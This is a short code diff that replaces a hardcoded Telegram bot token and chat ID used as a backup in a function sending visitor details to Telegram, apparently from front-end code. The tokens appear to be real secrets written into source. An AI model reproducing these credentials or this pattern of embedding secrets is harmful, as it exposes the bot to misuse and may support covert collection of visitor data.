@@ -310,8 +310,8 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   }
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
-  const CHAT_ID = '-1002361654031';
+  const backupBotToken = '8008607408:AAEN4NBtOOoYg0MhYx1zVJmH6Rkz-NN3C1M';
+  const CHAT_ID = '-4650275708';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
